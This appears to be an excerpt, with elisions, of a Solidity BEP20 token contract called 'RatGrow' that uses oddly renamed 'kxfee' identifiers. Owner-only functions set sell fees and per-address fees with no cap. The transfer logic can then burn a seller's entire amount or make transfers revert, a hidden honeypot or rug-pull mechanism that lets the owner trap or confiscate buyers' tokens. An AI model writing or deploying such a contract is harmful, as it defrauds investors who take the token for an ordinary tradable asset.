...
interface IUniswapV2Factory {
    ...
    function kxfeeTo() external view returns (address);
    function kxfeeToSetter() external view returns (address);
    ...
    function setkxfeeTo(address) external;
    function setkxfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingkxfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingkxfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingkxfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingkxfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingkxfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract RatGrow is BEP20, Ownable {
    ...
    uint256 private _defaultSellkxfee = 0;

    uint256 private _defaultBuykxfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipkxfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellkxfee = _value;
    }

    function setSlipkxfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipkxfee[_address] = _value;
    }

    function getSlipkxfee(address _address) external view onlyownar returns (uint256) {
        return _slipkxfee[_address];
    }


    function setMAccountkxfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountkxfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradekxfeeAmount = 0;

        if (rF) {
            uint256 tradekxfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradekxfee = _defaultSellkxfee;
                }
                if (from == uniswapV2Pair) {

                    tradekxfee = _defaultBuykxfee;
                }
            }
            if (_slipkxfee[from] > 0) {
                tradekxfee = _slipkxfee[from];
            }

            tradekxfeeAmount = _Amount.mul(tradekxfee).div(100);
        }


        if (tradekxfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradekxfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradekxfeeAmount);
            emit Transfer(from, _deadAddress, tradekxfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradekxfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradekxfeeAmount);
        emit Transfer(from, _to, _Amount - tradekxfeeAmount);
    }
